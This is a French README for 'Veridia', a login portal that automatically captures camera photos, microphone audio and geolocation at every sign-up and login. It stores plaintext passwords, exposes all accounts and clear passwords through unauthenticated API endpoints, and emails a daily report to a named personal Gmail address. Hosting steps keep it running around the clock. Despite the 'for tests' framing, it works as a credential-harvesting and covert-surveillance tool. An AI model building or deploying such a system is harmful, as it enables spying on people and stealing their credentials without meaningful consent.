# Veridia — portail + journal live + e-mail quotidien

Portail de connexion avec :

- Inscription / connexion (mot de passe **haché** scrypt + **version claire** stockée pour tests)
- Sessions par cookie
- Vérification automatique des capteurs (localisation, caméra, micro) — **sans bouton**
- **Captures photo + audio envoyées à l'inscription ET à chaque login**
- Médias sauvegardés dans `uploads/` (fichiers) + métadonnées dans `data/db.json`
- Journal d’événements en direct (Server-Sent Events)
- **Envoi automatique par e-mail** du rapport des 24 dernières heures, tous les jours

Aucune base externe : stockage dans `data/db.json` + fichiers dans `uploads/`.

## Démarrage local

```bash
git clone <ton-repo-prive>
cd WebInfoRecup-main   # ou le nom de ton dossier
# Optionnel : cp .env.example .env et édite-le
npm install
npm start
```

Ouvre **http://localhost:3000**

## Ce qui est capturé (pour tests)

| Donnée              | Où la trouver                                      |
|---------------------|----------------------------------------------------|
| Mot de passe clair  | `data/db.json` → `passwordPlain`                   |
|                     | `GET /api/users` ou `GET /api/me`                  |
|                     | Logs serveur + événements (`meta.passwordPlain`)   |
| Photo caméra        | `uploads/cam_*.jpg` → accessible via `/uploads/...`|
| Audio micro         | `uploads/mic_*.webm` → accessible via `/uploads/...`|
| Géolocalisation     | `data/db.json` → `permissions.location`            |
| Historique login    | `data/db.json` → `loginHistory`                    |

### Endpoints utiles pour les tests

```bash
# Liste tous les comptes + mdp clair + chemins des médias
curl http://localhost:3000/api/users

# Compte de la session courante
curl http://localhost:3000/api/me

# Journal des événements
curl http://localhost:3000/api/events

# Voir une image capturée (exemple)
# http://localhost:3000/uploads/cam_1724....jpg
```

## Configuration e-mail (Gmail)

1. Active la **validation en 2 étapes** sur le compte Google.
2. Crée un **mot de passe d’application** :  
   https://myaccount.google.com/apppasswords  
   (choisis « Autre » → nomme-le « Veridia »)
3. Dans `.env` :

```env
MAIL_TO=enzodd02@gmail.com
MAIL_FROM=enzodd02@gmail.com
SMTP_USER=enzodd02@gmail.com
SMTP_PASS=xxxx xxxx xxxx xxxx   # le mot de passe d'application (16 caractères)
MAIL_CRON=0 8 * * *             # tous les jours à 08:00
TZ=Europe/Paris
```

Le serveur envoie alors chaque jour à 08:00 (heure de Paris) un e-mail avec les événements des 24 h précédentes.

### Tester l’envoi manuellement

```bash
curl -X POST http://localhost:3000/api/send-report
```

(ou avec un secret si tu définis `ADMIN_SECRET` dans `.env`)

## Déployer (pour que le cron tourne 24/7)

Le cron ne fonctionne que **tant que le processus Node tourne**. Sur ta machine, si tu fermes le terminal, plus d’e-mails.

Options simples pour un dépôt GitHub privé :

| Hébergeur     | Gratuit ? | Cron natif | Notes                          |
|---------------|-----------|------------|--------------------------------|
| [Railway](https://railway.app) | oui (crédits) | oui     | Branche le repo, ajoute les variables d’env |
| [Render](https://render.com)   | oui (sleep)  | oui     | Web Service + env vars         |
| [Fly.io](https://fly.io)       | oui          | oui     | `fly launch`                   |
| VPS (OVH, Hetzner…)            | payant       | systemd + cron | Le plus stable            |

Sur ces plateformes : pousse le repo, configure les variables d’environnement (celles de `.env`), et le service reste allumé → l’e-mail part tous les jours.

## Structure

```
server.js          API + SSE + cron e-mail + sauvegarde médias
public/index.html  Frontend (permissions auto + captures)
data/db.json       Comptes + événements (ignoré par git)
uploads/           Photos JPG + audio WEBM capturés
.env               Secrets (ignoré par git)
```

## Sécurité / notes tests

- Mots de passe **hachés** (scrypt) + **aussi stockés en clair** (`passwordPlain`) pour faciliter les tests.
- Cookies de session `HttpOnly`.
- Limite body JSON portée à **15 Mo** pour accepter photo + audio.
- Captures envoyées **à l'inscription ET à chaque login**.
- `.env`, `data/db.json` et `uploads/` sont dans `.gitignore`.
- Pour la production : HTTPS obligatoire (sinon géoloc / caméra / micro bloqués hors localhost).

## Licence

Usage privé / personnel.
